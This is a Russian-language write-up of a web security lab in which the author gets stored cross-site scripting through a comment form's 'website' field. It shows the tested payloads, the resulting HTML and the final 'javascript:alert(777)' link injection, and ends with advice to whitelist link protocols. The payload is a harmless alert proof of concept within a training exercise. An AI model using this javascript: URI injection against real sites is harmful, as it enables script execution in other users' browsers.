```html
<p>
  <img src="/resources/images/avatarDefault.svg" class="avatar">
```

 пейлоад     >allert(777)

```html
 <p>&gt;allert(777)</p>
```

< > кодируются html

пейлоад     "'allert(777)
респонс 
```html
<p>&quot;&apos;allert(777)</p>
```
каквычки "  ' клжируются тоже html

```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &apos;
&  →  &amp;

```


нужно пейлоад вставлять в поле ввода имени чтобы поменять именно это  sitemy  место

на странице оставляения коммента есть поле где можно оставить ссылку на свой сайт:
и эта ссылка кликабельна , нужно лишь в нее подставить свой код, который бы выполнился при клике по ней




в браузерах есть несколько встроенных протоколов:
`http:` или `https:` — открывает веб-страницы
`mailto:` — открывает почтовый клиен
`tel:` — открывает программу для звонков
`file:` — открывает локальные файлы
`javascript:`  выполняет код JavaScript вместо перехода по ссылке

мне нужно выполнить код - поэтому подходит javascript

пейлоад  javascript:alert(777)
респонс   
при нажатии - аллерта нет
ответ "Not Found" 400
```html
<p>
  <img src="/resources/images/avatarDefault.svg" class="avatar">                            
  <a id="author" href="javascript:alert(777)">grerge</a> | 23 February 2026
</p>
```

аллерт сработал при нажатии на сайт!
отлично!
лаба решена!

---

короче, ==суть== лабы была в том, что поле «сайт» (website) без проверки вставляется прямо в href ссылки с именем автора. 
А так как кавычки экранировались, но сам протокол javascript: никто не фильтровал, то получилось классическое внедрение кода. просто заменил обычный адрес сайта на javascript:alert(777), и браузер честно выполнил эту команду при клике.


как защищаться

всегда проверять и жестко ограничивать протоколы в ссылках
разрешая только http и https, а лучше вообще не позволять пользователям влиять на атрибут href, 
используя белые списки или генерируя ссылки на сервере
